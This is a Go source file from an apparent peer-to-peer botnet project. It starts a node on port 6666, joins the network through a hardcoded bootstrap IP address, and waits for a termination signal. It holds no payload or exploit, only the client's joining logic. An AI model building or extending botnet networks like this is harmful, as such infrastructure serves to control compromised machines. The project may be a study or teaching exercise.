package application_layer

import (
	"fmt"
	"github.com/lampo100/botnet_p2p/models"
	"github.com/lampo100/botnet_p2p/business_logic_layer"
	"os"
	"os/signal"
	"syscall"
	"log"
)

var defaultPort uint32 = 6666

var terminateChannel = make(chan  struct{})

var bootstrapNode = models.Node{
	Host:  "77.55.235.125",
	Port:  defaultPort,
	IsNAT: false,
}

func RunApplication() {
	go interruptHandler()
	business_logic_layer.InitLayer(defaultPort, terminateChannel)
	_, err := business_logic_layer.JoinNetwork(bootstrapNode)
	if err != nil {
		fmt.Printf("[AL] Could not join network, error: %v\n", err)
	}
	<-terminateChannel
}

func interruptHandler() {
	signalChannel := make(chan os.Signal, 3)
	signal.Notify(signalChannel, os.Interrupt, syscall.SIGINT, syscall.SIGTERM)
	<-signalChannel
	close(terminateChannel)
	log.Println("[AL] Terminate signal received!")
}
